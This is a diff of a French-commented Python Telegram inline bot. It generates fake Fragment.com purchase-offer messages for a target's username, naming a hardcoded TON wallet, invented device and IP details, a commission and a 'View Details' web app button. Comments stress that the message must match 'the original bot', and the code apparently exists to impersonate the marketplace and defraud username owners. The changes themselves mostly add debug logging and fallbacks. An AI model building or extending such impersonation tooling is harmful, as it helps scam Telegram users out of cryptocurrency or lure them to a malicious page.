@@ -28,6 +28,7 @@ event_loop = None
 def get_ton_price():
     """Récupère le prix du TON en temps réel"""
     try:
+        # API CoinGecko plus fiable
         url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
         with urllib.request.urlopen(url, timeout=10) as response:
             data = json.loads(response.read().decode())
@@ -46,18 +47,31 @@ def get_ton_price():
                 return price
         except Exception as e2:
             print(f"❌ Erreur API DIA: {e2}")
+            # Prix par défaut si toutes les APIs échouent
             return 5.50
 
 def generate_fragment_message(username, ton_amount):
     """Génère le message Fragment avec formatage identique au bot original"""
-    ton_price = get_ton_price()
-    price = float(ton_amount)
-    price_usd = price * ton_price
-    commission = price * 0.05
-    commission_usd = commission * ton_price
-    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
-
-    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
+    try:
+        print(f"🔧 DEBUG: Début génération pour {username} - {ton_amount} TON")
+        
+        # Prix TON actuel - récupération en temps réel
+        ton_price = get_ton_price()
+        print(f"🔧 DEBUG: Prix TON récupéré: {ton_price}")
+        
+        # Calculs
+        price = float(ton_amount)
+        price_usd = price * ton_price
+        commission = price * 0.05
+        commission_usd = commission * ton_price
+        
+        print(f"🔧 DEBUG: Calculs - Price: {price}, USD: {price_usd}, Commission: {commission}")
+        
+        # Adresse wallet
+        wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
+        
+        # Message Fragment - IDENTIQUE au bot original
+        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
 • Commission: 💎{commission:g} (${commission_usd:.2f} USD)
@@ -73,91 +87,126 @@ Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
 
-    entities = []
-
-    # Offer Amount en gras
-    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
-    offer_start = fragment_message.find(offer_text)
-    if offer_start != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=offer_start,
-            length=len(offer_text)
-        ))
-
-    # Commission en gras
-    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
-    commission_start = fragment_message.find(commission_text)
-    if commission_start != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=commission_start,
-            length=len(commission_text)
-        ))
-
-    # Important en gras
-    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
-    important_start1 = fragment_message.find(important_text1)
-    if important_start1 != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=important_start1,
-            length=len(important_text1)
-        ))
-    important_text2 = "• If you choose not to proceed, simply ignore this message."
-    important_start2 = fragment_message.find(important_text2)
-    if important_start2 != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=important_start2,
-            length=len(important_text2)
-        ))
-
-    # Wallet lien cliquable (48 caractères)
-    wallet_start = fragment_message.find(wallet_address)
-    if wallet_start != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.TEXT_LINK,
-            offset=wallet_start,
-            length=48,  # Longueur exacte de UQ...PR
-            url=f"https://tonviewer.com/{wallet_address}"
-        ))
-        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
-
-    # BOUTON WEB APP INTÉGRÉ
-    webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
-    keyboard = InlineKeyboardMarkup([[
-        InlineKeyboardButton(
-            "View Details", 
-            web_app=WebAppInfo(url=webapp_url)
-        )
-    ]])
-    print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
-
-    return fragment_message, entities, keyboard
+        print(f"🔧 DEBUG: Message généré, longueur: {len(fragment_message)}")
+        
+        # Création des entités pour le formatage
+        entities = []
+        
+        try:
+            # 1. Offer Amount en gras
+            offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
+            offer_start = fragment_message.find(offer_text)
+            if offer_start != -1:
+                entities.append(MessageEntity(
+                    type=MessageEntity.BOLD,
+                    offset=offer_start,
+                    length=len(offer_text)
+                ))
+                print(f"🔧 DEBUG: Offer Amount bold ajouté à position {offer_start}")
+            
+            # 2. Commission en gras
+            commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
+            commission_start = fragment_message.find(commission_text)
+            if commission_start != -1:
+                entities.append(MessageEntity(
+                    type=MessageEntity.BOLD,
+                    offset=commission_start,
+                    length=len(commission_text)
+                ))
+                print(f"🔧 DEBUG: Commission bold ajouté à position {commission_start}")
+            
+            # 3. Premier point Important en gras
+            important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
+            important_start1 = fragment_message.find(important_text1)
+            if important_start1 != -1:
+                entities.append(MessageEntity(
+                    type=MessageEntity.BOLD,
+                    offset=important_start1,
+                    length=len(important_text1)
+                ))
+                print(f"🔧 DEBUG: Important 1 bold ajouté à position {important_start1}")
+            
+            # 4. Deuxième point Important en gras
+            important_text2 = "• If you choose not to proceed, simply ignore this message."
+            important_start2 = fragment_message.find(important_text2)
+            if important_start2 != -1:
+                entities.append(MessageEntity(
+                    type=MessageEntity.BOLD,
+                    offset=important_start2,
+                    length=len(important_text2)
+                ))
+                print(f"🔧 DEBUG: Important 2 bold ajouté à position {important_start2}")
+            
+            # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
+            wallet_start = fragment_message.find(wallet_address)
+            if wallet_start != -1:
+                entities.append(MessageEntity(
+                    type=MessageEntity.TEXT_LINK,
+                    offset=wallet_start,
+                    length=48,  # Longueur exacte de UQ...PR (48 caractères)
+                    url=f"https://tonviewer.com/{wallet_address}"
+                ))
+                print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
+            
+            print(f"🔧 DEBUG: {len(entities)} entités créées avec succès")
+            
+        except Exception as entity_error:
+            print(f"❌ DEBUG: Erreur création entités: {entity_error}")
+            # Si erreur avec les entités, on continue sans elles
+            entities = []
+        
+        # 📱 BOUTON WEB APP INTÉGRÉ - Reste dans Telegram
+        try:
+            webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
+            keyboard = InlineKeyboardMarkup([[
+                InlineKeyboardButton(
+                    "View Details", 
+                    web_app=WebAppInfo(url=webapp_url)
+                )
+            ]])
+            print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
+        except Exception as keyboard_error:
+            print(f"❌ DEBUG: Erreur création clavier: {keyboard_error}")
+            keyboard = None
+        
+        print(f"✅ DEBUG: Message Fragment généré avec succès pour {username}")
+        return fragment_message, entities, keyboard
+        
+    except Exception as e:
+        print(f"❌ DEBUG: Erreur dans generate_fragment_message: {e}")
+        import traceback
+        print(f"❌ DEBUG: Traceback: {traceback.format_exc()}")
+        raise e
 
 async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gestionnaire des requêtes inline"""
     print(f"🔍 DEBUG: inline_query_handler appelé")
+    
     try:
         from telegram import InlineQueryResultArticle, InputTextMessageContent
-
+        
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         print(f"🔍 DEBUG: Requête reçue: '{query}'")
-
+        
+        # Si pas de requête ou format incorrect - ne rien afficher (bot privé)
         if not query:
             print(f"🔍 DEBUG: Pas de query, envoi liste vide")
             await update.inline_query.answer([], cache_time=0)
             return
-
+        
+        # Parsing de la requête (username montant)
         parts = query.split()
         print(f"📝 DEBUG: Parties parsées: {parts}")
+        
+        # Si format incorrect - ne rien afficher (bot privé)
         if len(parts) < 2:
             print(f"🔍 DEBUG: Format incorrect, envoi liste vide")
             await update.inline_query.answer([], cache_time=0)
             return
-
-        username = parts[0].replace('@', '')
+        
+        username = parts[0].replace('@', '')  # Supprime @ si présent
+        print(f"📝 DEBUG: Username extrait: '{username}'")
+        
         try:
             ton_amount = float(parts[1])
             if ton_amount <= 0:
@@ -165,76 +214,162 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             print(f"📝 DEBUG: Montant validé: {ton_amount}")
         except ValueError as ve:
             print(f"📝 DEBUG: Erreur validation montant: {ve}")
+            # Ne rien afficher (bot privé)
             await update.inline_query.answer([], cache_time=0)
             return
-
+        
         print(f"✅ DEBUG: Paramètres validés: '{username}' - {ton_amount} TON")
+        
+        # ÉTAPE CRITIQUE - Génération du message avec format original
+        print(f"🔧 DEBUG: Appel de generate_fragment_message...")
+        try:
+            fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
+            print(f"✅ DEBUG: generate_fragment_message terminé avec succès")
+        except Exception as gen_error:
+            print(f"❌ DEBUG: Erreur dans generate_fragment_message: {gen_error}")
+            import traceback
+            print(f"❌ DEBUG: Traceback génération: {traceback.format_exc()}")
+            
+            # Ne rien afficher en cas d'erreur (bot privé)
+            await update.inline_query.answer([], cache_time=0)
+            return
+        
+        # Prix pour affichage
+        try:
+            current_ton_price = get_ton_price()
+            current_usd_value = ton_amount * current_ton_price
+            print(f"💰 DEBUG: Prix final - {ton_amount} TON = ${current_usd_value:.2f}")
+        except Exception as price_error:
+            print(f"💰 DEBUG: Erreur prix: {price_error}")
+            current_ton_price = 5.50
+            current_usd_value = ton_amount * current_ton_price
+        
+        # ÉTAPE CRITIQUE - Création du résultat inline
+        print(f"📤 DEBUG: Création du résultat inline...")
+        try:
+            result_id = f"deal_{username}_{ton_amount}_{int(time.time())}"
+            print(f"📤 DEBUG: ID résultat: {result_id}")
+            
+            results = [
+                InlineQueryResultArticle(
+                    id=result_id,
+                    title=f"Fragment Deal: @{username}",
+                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                    input_message_content=InputTextMessageContent(
+                        fragment_message,
+                        entities=entities,
+                        disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
+                    ),
+                    reply_markup=keyboard
+                )
+            ]
+            
+            print(f"📤 DEBUG: Résultat créé, envoi en cours...")
+            await update.inline_query.answer(results, cache_time=0)
+            print(f"✅ DEBUG: Réponse inline envoyée avec succès: {username} - {ton_amount} TON (${current_usd_value:.2f})")
+        
+        except Exception as result_error:
+            print(f"❌ DEBUG: Erreur création résultat: {result_error}")
+            import traceback
+            print(f"❌ DEBUG: Traceback résultat: {traceback.format_exc()}")
+            
+            # Fallback avec formatage simplifié mais fonctionnel
+            try:
+                # Récréation d'un message simple sans entités complexes
+                simple_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
-        # Utilisation de generate_fragment_message() EXACTE
-        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
+• Offer Amount: 💎{ton_amount:g} TON
+• Commission: 💎{ton_amount * 0.05:g} TON
 
-        current_ton_price = get_ton_price()
-        current_usd_value = ton_amount * current_ton_price
+Additional Information:
+• Device: Safari on macOS  
+• IP Address: 103.56.72.245
+• Wallet: UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR
 
-        results = [
-            InlineQueryResultArticle(
-                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
-                title=f"Fragment Deal: @{username}",
-                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
-                input_message_content=InputTextMessageContent(
-                    fragment_message,
-                    entities=entities,
-                    disable_web_page_preview=True
-                ),
-                reply_markup=keyboard
-            )
-        ]
-        await update.inline_query.answer(results, cache_time=0)
-        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
-
+Important:
+• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
+• If you choose not to proceed, simply ignore this message."""
+                
+                fallback_results = [
+                    InlineQueryResultArticle(
+                        id=f"simple_{username}_{ton_amount}",
+                        title=f"Fragment Deal: @{username}",
+                        description=f"💎 {ton_amount:g} TON",
+                        input_message_content=InputTextMessageContent(
+                            simple_message,
+                            disable_web_page_preview=True
+                        )
+                    )
+                ]
+                await update.inline_query.answer(fallback_results, cache_time=0)
+                print("📤 DEBUG: Fallback simple envoyé avec succès")
+            except Exception as fallback_error:
+                print(f"❌ DEBUG: Même le fallback a échoué: {fallback_error}")
+                # En dernier recours, liste vide
+                await update.inline_query.answer([], cache_time=0)
+        
     except Exception as e:
         print(f"❌ DEBUG: Erreur critique dans inline_query_handler: {e}")
         import traceback
         print(f"❌ DEBUG: Traceback critique: {traceback.format_exc()}")
+        # En cas d'erreur critique, liste vide
         await update.inline_query.answer([], cache_time=0)
 
 class WebhookHandler(BaseHTTPRequestHandler):
+    """Gestionnaire webhook HTTP simple"""
+    
     def do_POST(self):
+        """Gestion des requêtes POST"""
         global app, event_loop
+        
         try:
             if self.path != f'/{BOT_TOKEN}':
                 self.send_response(404)
                 self.end_headers()
                 return
+            
+            # Lecture des données
             content_length = int(self.headers.get('content-length', 0))
             post_data = self.rfile.read(content_length)
+            
+            # Parse JSON
             update_data = json.loads(post_data.decode('utf-8'))
+            
+            # Traitement asynchrone
             if app and event_loop:
                 asyncio.run_coroutine_threadsafe(
                     process_update(update_data),
                     event_loop
                 )
+            
+            # Réponse OK
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.end_headers()
             self.wfile.write(b'{"ok":true}')
+            
         except Exception as e:
             print(f"❌ Erreur webhook: {e}")
             self.send_response(500)
             self.end_headers()
-
+    
     def do_GET(self):
+        """Page de status simple"""
         self.send_response(200)
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
+        
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
-
+    
     def log_message(self, format, *args):
+        """Désactiver les logs HTTP"""
         pass
 
 async def process_update(update_data):
+    """Traitement des updates Telegram"""
     global app
+    
     try:
         if app:
             update = Update.de_json(update_data, app.bot)
@@ -244,6 +379,7 @@ async def process_update(update_data):
         print(f"❌ Erreur traitement update: {e}")
 
 def run_webhook_server():
+    """Démarre le serveur webhook"""
     try:
         server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
         print(f"🌐 Serveur webhook démarré sur le port {PORT}")
@@ -252,28 +388,49 @@ def run_webhook_server():
         print(f"❌ Erreur serveur webhook: {e}")
 
 async def setup_bot():
+    """Configuration du bot"""
     global app, event_loop
+    
     try:
+        # Création de l'application
         app = Application.builder().token(BOT_TOKEN).build()
+        
+        # Ajout du gestionnaire inline
         app.add_handler(InlineQueryHandler(inline_query_handler))
+        
+        # Initialisation
         await app.initialize()
         await app.start()
+        
+        # Configuration du webhook
         webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
         await app.bot.set_webhook(url=webhook_url)
+        
         print(f"✅ Bot initialisé avec webhook: {webhook_url}")
+        
+        # Garde l'event loop actif
         event_loop = asyncio.get_event_loop()
+        
+        # Démarrage du serveur webhook dans un thread séparé
         webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
         webhook_thread.start()
+        
+        # Attente infinie
         while True:
             await asyncio.sleep(1)
+            
     except Exception as e:
         print(f"❌ Erreur setup bot: {e}")
         raise
 
 def main():
+    """Fonction principale"""
     try:
         print("🚀 Démarrage du bot inline...")
+        
+        # Démarrage asynchrone
         asyncio.run(setup_bot())
+        
     except KeyboardInterrupt:
         print("🛑 Arrêt du bot...")
     except Exception as e:
